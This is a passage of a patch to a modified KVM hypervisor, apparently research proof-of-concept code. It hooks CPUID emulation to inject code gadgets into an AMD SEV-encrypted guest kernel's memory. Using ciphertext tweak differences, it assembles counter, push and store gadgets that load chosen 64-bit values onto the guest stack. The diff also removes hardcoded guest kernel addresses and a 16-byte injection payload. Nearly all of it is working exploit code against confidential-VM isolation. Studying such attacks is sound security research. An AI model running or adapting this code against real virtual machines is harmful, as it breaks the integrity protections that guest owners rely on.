+			 LCE_INJ_NOP_PUSH, long_counter_base_inj[LCB_INJ_JMP_CPUID]->gpa + 16,
+			 vcpu->kvm);
+
+	 precalc_injection(long_counter_extra_inj_tmpl,long_counter_extra_inj,
+			 LCE_INJ_PUSH_PUSH, long_counter_base_inj[LCB_INJ_JMP_CPUID]->gpa + 16,
+			 vcpu->kvm);
+
+	 //precalc LCE_ST_INJ_JMP_14, LCE_ST_INJ_XOR_ESI and LCE_ST_STORE_JMP_BACK
+	 for( i = 2; i < 5; i++ ) {
+		 precalc_injection(long_counter_extra_inj_tmpl,long_counter_extra_inj,
+				 LCE_ST_INJ_JMP_14 + ( i - 2 ), 
+				 long_counter_base_inj[LCB_INJ_JMP_CPUID]->gpa + ( i * 16),
+				 vcpu->kvm);
+	 }
+
+
+
+
+    // move the two long instructions
+    if (0 !=
+        (err = write_mapped(long_inc_jmp_target_gpa, 16, long_inc_jmp_block,
+                            load_gadget.text_mapping))) {
+      printk("failed to move long_inc_jmp_block to target gpa\n");
+    }
+    if (0 !=
+        (err = write_mapped(long_shl_jmp_target_gpa, 16, long_shl_jmp_block,
+                            load_gadget.text_mapping))) {
+      printk("failed to move long_shl_jmp_block to target gpa\n");
+    }
+#ifdef LOG
+    printk("wrote inc_jmp to gpa %016llx and shl_jmp to gpa %016llx\n",
+           long_inc_jmp_target_gpa, long_shl_jmp_target_gpa);
+#endif
+
+    // signal that handle_long_counter_gadget should take over on next cpuid
+    // call
+    load_gadget.type = 3;
+    load_gadget.curr_bit = 63;
+    // extra wbinvd() due to return
+    wbinvd();
+    printk("end of first gadget at %lld\n", ktime_get_real_ns());
+    return;
+  }
+
+  // ####
+  // Start: Decide Betwen inc and nop
+  // we write from highest to lowset bit
+  uint64_t mask = 0x1 << (load_gadget.curr_bit);
+  // bit set => use inc block;
+  if (load_gadget.target_value & mask) {
+    // load_gadget contains gpa of last block of load_gadget
+    inc_variant.gpa = load_gadget.last_gpa - (3 * 16);
+    if (!nf_simple_inject_code(vcpu->kvm, &inc_variant,
+                               load_gadget.text_mapping)) {
+      printk("handle_counter_gadget: failed to inject inc block\n");
+    } else {
+#ifdef LOG
+      printk("handle_counter_gadget: injected inc block at gpa = %016llx\n",
+             inc_variant.gpa);
+#endif
+    }
+  } else { // bit not set => use nop block
+    // load_gadget contains gpa of last block of load_gadget
+    nop_variant.gpa = load_gadget.last_gpa - (3 * 16);
+    if (!nf_simple_inject_code(vcpu->kvm, &nop_variant,
+                               load_gadget.text_mapping)) {
+      printk("handle_counter_gadget: failed to inject nop block\n");
+    } else {
+#ifdef LOG
+      printk("handle_counter_gadget: injected nop block at gpa = %016llx\n",
+             nop_variant.gpa);
+#endif
+    }
+  }
+  // END: Decide Between inc and nop
+  //###
+
+  // at end of round
+  // after resuming last bit will be written
+  if (load_gadget.curr_bit == 0) {
+#ifdef LOG
+    printk("handle_counter_gadget: curr_bit == 0 and round = %d\n",
+           load_gadget.round);
+#endif
+
+    // transition from round 1 to round 2
+    if (load_gadget.round == 1) {
+      // store previous content and insert reset jump
+      if (0 != (err = read_mapped(load_gadget.last_gpa - 16, shl_back_jump, 32,
+                                  load_gadget.text_mapping))) {
+        printk("handle_counter_gadget: failed to read normal jump code from "
+               "gpa = %016llx\n",
+               load_gadget.last_gpa);
+      } else {
+#ifdef LOG
+        printk("stored shl and normal back jump code\n");
+#endif
+      }
+
+      // set target value for next round(
+      load_gadget.target_value = 0xd1e6eb0c;
+    }
+
+    // prepare for next round
+    // replace shl with push push block to store on stack. double push
+    // to make sure one of them has correct alignment
+    if (load_gadget.round != 0) {
+      push_push_variant.gpa = load_gadget.last_gpa - (1 * 16);
+      if (!nf_simple_inject_code(vcpu->kvm, &push_push_variant,
+                                 load_gadget.text_mapping)) {
+        printk("handle_counter_gadget: failed to inject push_push block\n");
+      } else {
+#ifdef LOG
+        printk("handle_counter_gadget: injected push push block at gpa = "
+               "%016llx\n",
+               push_push_variant.gpa);
+#endif
+      }
+    }
+
+    // reset jump only at transtion from round 1 to round 2
+    if (load_gadget.round == 1) {
+
+      reset_jmp_variant.gpa = load_gadget.last_gpa;
+      if (!nf_simple_inject_code(vcpu->kvm, &reset_jmp_variant,
+                                 load_gadget.text_mapping)) {
+        printk("handle_counter_gadget: failed to inject reset jump\n");
+      } else {
+#ifdef LOG
+        printk("handle_counter_gadget: injected reset jump at gpa = %016llx\n",
+               reset_jmp_variant.gpa);
+#endif
+      }
+    }
+
+    // transition from round 0 to round 1 : stack detect
+    if (load_gadget.round == 0) {
+      push_pop_variant.gpa = load_gadget.last_gpa - (3 * 16);
+      if (!nf_simple_inject_code(vcpu->kvm, &push_pop_variant,
+                                 load_gadget.text_mapping)) {
+        printk("handle_stack_detect_gadget: failed to inject push pop block\n");
+      } else {
+#ifdef LOG
+        printk("handle_stack_detect_gadget: injected push pop block\n");
+#endif
+      }
+
+      // remove write access from all pages
+#ifdef LOG
+      printk("handle_stack_detect_gadget: transition from round 0 to round 1 "
+             ": removing write access...\n");
+#endif
+      kvm_stop_tracking(vcpu);
+      __kvm_start_tracking(vcpu, KVM_PAGE_TRACK_ACCESS);
+		//the page fault handler copies the content of the lest recent page fault
+		//into this buffer. At this point the page was not changed. In the next
+		//cpuid round, the stack operations are done. Then we take another snapshot
+		//and compare both, to get the page offset of the stack
+	   load_gadget.stack_page_pre_write = vmalloc(4096);
+      load_gadget.waiting_for_fault = 1;
+    }
+
+    load_gadget.curr_bit = highest_bit_index; // reset value for next round
+    load_gadget.round++;
+
+  } else { // load_gadget.curr_bit != 0
+    load_gadget.curr_bit--;
+  }
+  load_gadget.repetition_counter++;
+  // unexpected cpuid argument, somebody else must have used it, abort
+  // Note: probably we could just wait until our expected value comes through
+
+  // swap prev_prev_eax and prev_eax in load_gadget
+  uint32_t tmp = load_gadget.prev_prev_eax;
+  load_gadget.prev_prev_eax = load_gadget.prev_eax;
+  load_gadget.prev_eax = tmp;
+
+  //#####
+  // Final wbinvd
+  wbinvd();
+  //#####
+}
+
+enum long_counter_states {
+  ROUND_FIRST_PL = 3,
+  ROUND_SECOND_PL = 4,
+  ROUND_CLEANUP = 5
+};
+
+
+static void handle_long_counter_gadget(struct kvm_vcpu *vcpu, uint32_t eax) {
+#undef LOG
+  //#define LOG
+  const uint64_t test_counter_max = 1100;
+  static uint64_t test_counter = test_counter_max;
+  const uint64_t highest_bit_index = 63;
+  const uint64_t payloads[2] = {0xa002030405060708ULL, 0xff090a0b0c0d0e0fULL};
+  int err;
+  if (load_gadget.type != 3 || load_gadget.round == (ROUND_CLEANUP + 1)) {
+    return;
+  };
+
+  //######
+  // Inital wbinvd()
+  wbinvd();
+  //#####
+  //
+  
+
+  if (load_gadget.round == ROUND_CLEANUP) {
+
+    // replace X1A1 with pop rsi;pop rsi
+    inj_pop_pop.gpa = inj_prefix_A.gpa;
+    if (!nf_simple_inject_code(vcpu->kvm, &inj_pop_pop,
+                               load_gadget.text_mapping)) {
+      printk("handle_long_counter_gadget: failed to insert inj_pop_pop at gpa "
+             "%016llx\n",
+             inj_pop_pop.gpa);
+    }
+
+    // replace long instr with pop rsi; ret or just ret
+    // depening on stack inital stack alignment alignment
+    if (load_gadget.fault_gpa % 16 == 0) {
+      inj_ret.gpa = long_inc_jmp_target_gpa;
+      if (!nf_simple_inject_code(vcpu->kvm, &inj_ret,
+                                 load_gadget.text_mapping)) {
+        printk("handle_long_counter_gadget: failed to insert inj_ret at gpa "
+               "%016llx\n",
+               inj_ret.gpa);
+      }
+    } else if (load_gadget.fault_gpa % 16 == 8) {
+      inj_pop_ret.gpa = long_inc_jmp_target_gpa;
+      if (!nf_simple_inject_code(vcpu->kvm, &inj_pop_ret,
+                                 load_gadget.text_mapping)) {
+        printk(
+            "handle_long_counter_gadget: failed to insert inj_pop_ret at gpa "
+            "%016llx\n",
+            inj_pop_ret.gpa);
+      }
+    } else {
+      WARN_ON(true);
+    }
+
+    // extra wbinvd() due to return
+    wbinvd();
+
+    unmap_physical(&load_gadget.text_mapping, &load_gadget.text_page);
+    unmap_physical(&load_gadget.stack_mapping, &load_gadget.stack_page);
+    load_gadget.round++;
+    // TODO:debug to run multiple times
+    test_counter = test_counter_max;
+
+    return;
+  }
+
+  // load payload for this round
+  if (load_gadget.round <= ROUND_SECOND_PL &&
+      load_gadget.curr_bit == highest_bit_index) {
+
+    load_gadget.target_value = payloads[load_gadget.round - ROUND_FIRST_PL];
+    // TODO: if we wanted to move this we would need to apply tweak diff now
+#ifdef LOG
+    printk("handle_long_counter_gadget: round %d set payload to %016llx "
+           "load_gadget.target_value\n",
+           load_gadget.round, load_gadget.target_value);
+#endif
+  }
+
+  // re inject X2||B1 code if we come from store/reset after ROUND_SECOND_PL
+  if (load_gadget.round == ROUND_SECOND_PL &&
+      load_gadget.curr_bit == highest_bit_index) {
+    // gpa already setup by load code in 4 byte oracle
+    if (!nf_simple_inject_code(vcpu->kvm, &inj_prefix_B,
+                               load_gadget.text_mapping)) {
+      printk("handle_long_counter_gadget: failed to reinsert inj_prefix_B"
+             " at gpa %016llx after reset\n",
+             inj_prefix_B.gpa);
+    } else {
+#ifdef LOG
+      printk("handle_long_counter_gadget: reinserted inj_prefix_B at gpa "
+             "%016llx\n",
+             inj_prefix_B.gpa);
+#endif
+    }
+  }
+
+  //####
+  // START: Decide between inc and jump to shl
+  uint64_t mask = 0x1ULL << load_gadget.curr_bit;
+#ifdef LOG
+  printk("mask\t=%016llx\n,", mask);
+  printk("targv\t=%016llx\n", load_gadget.target_value);
+#endif
+  // inc : load prefix and long instuction
+  if (load_gadget.target_value & mask) {
+
+ /*   if (!nf_simple_inject_code(vcpu->kvm, &inj_prefix_A,
+                               load_gadget.text_mapping)) {
+      printk("handle_long_counter_gadget: failed to insert prefix_A at gpa "
+             "%016llx\n",
+             inj_prefix_A.gpa);
+    }
+	 */
+	  //buffered variant of the commneted code block above
+	  if( !nf_buffered_inject(vcpu->kvm,long_counter_base_inj[LCB_INJ_PREFIX_A],
+					  long_counter_base_inj_cache[LCB_INJ_PREFIX_A],
+					  load_gadget.text_mapping) ) {
+      printk("handle_long_counter_gadget: failed to insert prefix_A at gpa "
+             "%016llx\n",
+             inj_prefix_A.gpa);
+	  }
+
+    wbinvd();
+    if (0 !=
+        (err = write_mapped(long_inc_jmp_target_gpa, 16, long_inc_jmp_block,
+                            load_gadget.text_mapping))) {
+      printk("failed to move long_inc_jmp_block to target gpa\n");
+    }
+    wbinvd();
+
+#ifdef LOG
+    printk("target value = %016llx\t curr_bit = %lld  inj_prefix_A at %016llx "
+           "and long_inc_jmp_target at %016llx\n",
+           load_gadget.target_value, load_gadget.curr_bit, inj_prefix_A.gpa,
+           long_inc_jmp_target_gpa);
+#endif
+  } else { // jump to shl : only need to jump over long instruction
+#ifdef LOG
+    printk("inj_skip_A: gpa %016llx first byte %08x second byte %08x\n",
+           inj_skip_A.gpa, inj_skip_A.injection_code_buffer[0],
+           inj_skip_A.injection_code_buffer[1]);
+#endif
+    /*if (!nf_simple_inject_code(vcpu->kvm, &inj_skip_A,
+                               load_gadget.text_mapping)) {
+      printk("handle_long_counter_gadget: failed to insert inj_skip_A at gpa "
+             "%016llx\n",
+             inj_skip_A.gpa);
+    }
+	 */
+	  if( !nf_buffered_inject(vcpu->kvm,&long_counter_extra_inj[LCE_INJ_SKIP_A].inj,
+					  long_counter_extra_inj[LCE_INJ_SKIP_A].buffer,
+					  load_gadget.text_mapping) ) {
+      printk("handle_long_counter_gadget: failed to insert inj_skip_a at gpa "
+             "%016llx\n",
+             long_counter_extra_inj[LCE_INJ_SKIP_A].inj.gpa);
+	  }
+	 
+#ifdef LOG
+    printk("target value = %016llx curr_bit = %lld  inserted skip / not set "
+           "bit at gpa %016llx\n",
+           load_gadget.target_value, load_gadget.curr_bit, inj_skip_A.gpa);
+#endif
+  }
+  // END: Decide between inc and nop
+  //####
+
+  if (load_gadget.curr_bit > 0) {
+    load_gadget.curr_bit--;
+  } else { // at end of round / load_gadget.curr_bit == 0
+
+    // insert jump to store at X2||B1. And the store gadget itself.
+    // This also skips the shl instruction
+    // TODO: test_counter is debug condition
+    if (test_counter == 0 && (load_gadget.round == ROUND_FIRST_PL ||
+                              load_gadget.round == ROUND_SECOND_PL)) {
+
+      // inject jmp to store gadget
+		/*
+      inj_jmp_store_B.gpa = inj_prefix_B.gpa;
+      if (!nf_simple_inject_code(vcpu->kvm, &inj_jmp_store_B,
+                                 load_gadget.text_mapping)) {
+        printk("handle_long_counter_gadget: failed to inject inj_jmp_store at "
+               "gpa %016llx\n",
+               inj_jmp_store_B.gpa);
+      }
+		*/
+	  if( !nf_buffered_inject(vcpu->kvm,
+				  &long_counter_extra_inj[LCE_INJ_JMP_STORE_B].inj,
+				  long_counter_extra_inj[LCE_INJ_JMP_STORE_B].buffer,
+				  load_gadget.text_mapping) ) {
+      printk("handle_long_counter_gadget: failed to insert jmp_store_b at gpa "
+             "%016llx\n",
+             long_counter_extra_inj[LCE_INJ_JMP_STORE_B].inj.gpa);
+	  }
+
+
+      // decide betwen nop push and push push based on stack alingment
+      if (load_gadget.fault_gpa % 16 == 0) {
+        //  load nop push store gadget
+        /*
+			inj_nop_push.gpa = inj_jmp_cpuid.gpa + (1 * 16);
+        if (!nf_simple_inject_code(vcpu->kvm, &inj_nop_push,
+                                   load_gadget.text_mapping)) {
+          printk("handle_long_counter_gadget: failed to inject inj_nop_push "
+                 "at gpa %016llx\n",
+                 inj_nop_push.gpa);
+			 */
+			  if( !nf_buffered_inject(vcpu->kvm,
+								&long_counter_extra_inj[LCE_INJ_NOP_PUSH].inj,
+								long_counter_extra_inj[LCE_INJ_NOP_PUSH].buffer,
+								load_gadget.text_mapping) ) {
+				printk("handle_long_counter_gadget: failed to insert prefix_A at gpa "
+						 "%016llx\n",
+						 inj_prefix_A.gpa);
+        } else {
+#ifdef LOG
+          printk("handle_long_counter_gadget: in round %d  with 16 byte "
+                 "aligned stack, injected inj_nop_push at gpa %016llx\n",
+                 load_gadget.round, inj_nop_push.gpa);
+#endif
+        }
+      } else if (load_gadget.fault_gpa % 16 == 8) {
+        // load push push store if in ROUND_FIST_PL and nop push else
+        if (load_gadget.round == ROUND_FIRST_PL) {
+			  /*
+          inj_push_push.gpa = inj_jmp_cpuid.gpa + (1 * 16);
+          if (!nf_simple_inject_code(vcpu->kvm, &inj_push_push,
+                                     load_gadget.text_mapping)) {
+            printk("handle_long_counter_gadget: failed to inject inj_push_push "
+                   "at gpa %016llx\n",
+                   inj_push_push.gpa);
+			}
+			*/
+
+			  if( !nf_buffered_inject(vcpu->kvm,
+							&long_counter_extra_inj[LCE_INJ_PUSH_PUSH].inj,
+							long_counter_extra_inj[LCE_INJ_PUSH_PUSH].buffer,
+							load_gadget.text_mapping) ) {
+				printk("handle_long_counter_gadget: failed to insert prefix_A at gpa "
+						 "%016llx\n",
+						 inj_prefix_A.gpa);
+          } else {
+#ifdef LOG
+            printk("handle_long_counter_gadget: in ROUND_FIRST_PL with 8 byte "
+                   "aligned stack, injected inj_push_push\n");
+#endif
+          }
+        }
+
+        if (load_gadget.round == ROUND_SECOND_PL) {
+			  /*
+          inj_nop_push.gpa = inj_jmp_cpuid.gpa + (1 * 16);
+          if (!nf_simple_inject_code(vcpu->kvm, &inj_nop_push,
+                                     load_gadget.text_mapping)) {
+            printk("handle_long_counter_gadget: failed to inject inj_nop_push "
+                   "at gpa %016llx\n",
+                   inj_nop_push.gpa);
+			  }
+						 */
+
+			  if( !nf_buffered_inject(vcpu->kvm,
+						  &long_counter_extra_inj[LCE_INJ_NOP_PUSH].inj,
+						  long_counter_extra_inj[LCE_INJ_NOP_PUSH].buffer,
+						  load_gadget.text_mapping) ) {
+				printk("handle_long_counter_gadget: failed to insert prefix_A at gpa "
+						 "%016llx\n",
+						 inj_prefix_A.gpa);
+          } else {
+#ifdef LOG
+            printk("handle_long_counter_gadget: in ROUND_SECOND_PL with 8 byte "
+                   "aligned stack, injected inj_nop_push at gpa %016llx\n",
+                   inj_nop_push.gpa);
+#endif
+          }
+        }
+      } else {
+        // This should not happen
+        WARN_ON(true);
+      }
+
+      // insert invariant part of store gadget
+		/*
+      inj_jmp_14.gpa = inj_jmp_cpuid.gpa + (2 * 16);
+      inj_xor_esi.gpa = inj_jmp_cpuid.gpa + (3 * 16);
+      inj_store_jmp_back.gpa = inj_jmp_cpuid.gpa + (4 * 16);
+      bool b = true;
+      b &= nf_simple_inject_code(vcpu->kvm, &inj_jmp_14,
+                                 load_gadget.text_mapping);
+      b &= nf_simple_inject_code(vcpu->kvm, &inj_xor_esi,
+                                 load_gadget.text_mapping);
+      b &= nf_simple_inject_code(vcpu->kvm, &inj_store_jmp_back,
+                                 load_gadget.text_mapping); */
+	  bool b = true;
+	  b &= nf_buffered_inject(vcpu->kvm,
+			  &long_counter_extra_inj[LCE_ST_INJ_JMP_14].inj,
+			  long_counter_extra_inj[LCE_ST_INJ_JMP_14].buffer,
+			  load_gadget.text_mapping);
+	  b &= nf_buffered_inject(vcpu->kvm,
+			  &long_counter_extra_inj[LCE_ST_INJ_XOR_ESI].inj,
+			  long_counter_extra_inj[LCE_ST_INJ_XOR_ESI].buffer,
+			  load_gadget.text_mapping);
+	  b &= nf_buffered_inject(vcpu->kvm,
+			  &long_counter_extra_inj[LCE_ST_INJ_STORE_JMP_BACK].inj,
+			  long_counter_extra_inj[LCE_ST_INJ_STORE_JMP_BACK].buffer,
+			  load_gadget.text_mapping);
+
+      if (!b) {
+        printk("There was on error injection the invariant part of the store "
+               "gadget\n");
+      } else {
+#ifdef LOG
+        printk("injected invariant part of the store gadget\n");
+#endif
+      }
+    }
+
+    // init next round
+    // TODO:start debug
+    if (load_gadget.round == ROUND_SECOND_PL && test_counter > 0) {
+      load_gadget.round =
+          ROUND_FIRST_PL -
+          1; // -1 because we inc round right after this if block
+
+      // let it run 10 times to fill up cache before starting measurment
+      if (test_counter == test_counter_max - 10) {
+        printk("Value of test_counter = %lld. k_time_get_real_ns = %lld \n",
+               test_counter, ktime_get_real_ns());
+      }
+      test_counter--;
+
+		if( test_counter % 100 == 0 ) {
+			printk("Long Counter: Progress: Value of test_counter %lld\n",test_counter);
+		}
+
+
+      if (test_counter == 1) {
+        printk("Value of test_counter = %lld. k_time_get_real_ns = %lld \n",
+               test_counter, ktime_get_real_ns());
+      }
+    }
+    // TODO:end debug
+    load_gadget.round++;
+    load_gadget.curr_bit = highest_bit_index;
+  }
+
+  //####
+  // Final wbinvd();
+  wbinvd();
+  //####
 }
 
 
@@ -1152,41 +2153,8 @@ int kvm_emulate_cpuid(struct kvm_vcpu *vcpu) {
   u32 eax, ebx, ecx, edx;
   static long long counter = 0;
   static bool start_counting = false;
-
-	//EDITME: set correct values for source_gpa and target_gpa
-	// there are presets for the kernels used in SEVurity
-	/*
-	 *location of c->x86_model_id[3] used in get_model_name.
-	  c->x86_model_id [2] to [5] span a 16 byte aligned 16 byte block
-	 *as this function is static and not exported manual analysis
-	 * is required
-	*/
-	uint64_t source_gpa;  
-
-	/*
-	 *location where i want to insert the loop ( right
-	 *after the move statement after the third call to cpuid)
-	 *as this function is static and not exported manual analysis
-	 * is required
-	*/
-	uint64_t target_gpa;
-
-	/*
-	*these are the addresses for the kernel used in the guest kernel
-	5.0.27 (for non-sev and "normal" sev (no sev-es) )
-	*/
-  source_gpa = 0x4e37720;
-  target_gpa = 0x36442A0;   
-
-  //these are the addresses that are used in the sev-es guest kernel case
-/*
-  source_gpa = 0x5425e40; 
-  target_gpa = 0x4041ed0; 
-*/
-
   // max number of cpuid calls that are displayed after counting started
-  uint64_t limit;
-  limit  = 100;
+  uint64_t limit = 10;
 
   if (cpuid_fault_enabled(vcpu) && !kvm_require_cpl(vcpu, 0))
     return 1;
@@ -1201,15 +2169,15 @@ int kvm_emulate_cpuid(struct kvm_vcpu *vcpu) {
    * not with eax = 0x80000002. This code is first used in the kernel.
    *
    */
-  if (!start_counting && eax == 0x80000002 ) {
+  if (!start_counting && eax == 0x80000002) {
     start_counting = true;
   }
 
   if (start_counting) {
     counter++;
-    if (counter < limit) {
-      printk("kvm_emulate_cpuid call nr. %lld. eax == %08x\n", counter, eax);
-    }
+    // if (counter < limit) {
+    // printk("kvm_emulate_cpuid call nr. %lld. eax == %08x\n", counter, eax);
+    //}
   }
 
   // orignal kvm code, look up cpuid values
@@ -1218,61 +2186,22 @@ int kvm_emulate_cpuid(struct kvm_vcpu *vcpu) {
 
   if (start_counting) {
 
-	
-	 /* 
-	  * EDITME: Set correct value for injected code variable code.
-	  * The code should perform a loop around the cpuid calls in
-	  * arch/x86/kernel/cpu/common.c:get_model_name
-     * For the kernels analyzed in SEVurity this requires to
-     * "complete" the opcode of the mov instruction that laps into 
-     * the 16 byte block after the block containing the last of the three cpuid
-     * calls. Then perform a jump back (e9 <relative  offset>)
-    */
+    // Handover proctocol is designed in a way that this must be called
+    // before handle_counter_gadget else we would jump into this to early
+    handle_long_counter_gadget(vcpu, eax);
 
-    //this is the code for the kernel version used in the non sev-es and plain sev case
-	 uint8_t code[16] = {0x20, 0xe9, 0x56, 0xff, 0xff, 0xff, 0x01, 0x02,
-                        0x03, 0x04, 0x5,  0x6,  0x7,  0x8,  0x9,  0xa};
-    
-    //this is the code used for the sev-es-guest kernel
-//    uint8_t code[16] = {0xb6, 0x43, 0x74, 0xE9, 0x5e, 0xFF, 0xFF, 0xFF, 0x1, 0x2,// 0x3, 0x4,0x5,0x6,0x7, 0x8};
-    uint8_t tweak_diff[16];
-    if (counter == 1) {
-      printk("source gpa is %016llx\t target gpa is %016llx\n", source_gpa,
-             target_gpa);
-    }
-
-    get_source_target_tweakdiff(vcpu->kvm, source_gpa, target_gpa, tweak_diff);
-
-    if (counter == 1) {
-      printk("tweak diff is:\n");
-      print_blockwise(tweak_diff, 16);
-    }
-
-    // If sev is enabled, we need to apply tweak data to the plaintext.
-    // Note that @code is a local object (so we don't apply the tweak more than once)
-#ifndef NO_SEV
-    xor_in_place(code, tweak_diff);
-#endif
-
-    if (counter == 1) {
-      printk(" injection code xor tweak diff is:\n");
-      print_blockwise(code, 16);
-    }
-
-	 //handles the logic behind the injection and restoration of the
-	 //original control flow
-    inject_16_byte(1, counter, code, 16, &eax, &ebx, &ecx, &edx, tweak_diff,
-                   vcpu, source_gpa, target_gpa);
+    handle_counter_gadget(vcpu, eax);
+    // handle_stack_detect_gadget(vcpu, eax);
   }
 
   kvm_register_write(vcpu, VCPU_REGS_RAX, eax);
   kvm_register_write(vcpu, VCPU_REGS_RBX, ebx);
   kvm_register_write(vcpu, VCPU_REGS_RCX, ecx);
   kvm_register_write(vcpu, VCPU_REGS_RDX, edx);
-
   if (start_counting && counter < limit) {
-    printk("Return : eax = %08x\t ebx=%08x \t ecx=%08x\t edx=%08x\n", eax, ebx,
-           ecx, edx);
+    // printk("Return : eax = %08x\t ebx=%08x \t ecx=%08x\t edx=%08x\n", eax,
+    // ebx,
+    //      ecx, edx);
   }
   return kvm_skip_emulated_instruction(vcpu);
 }
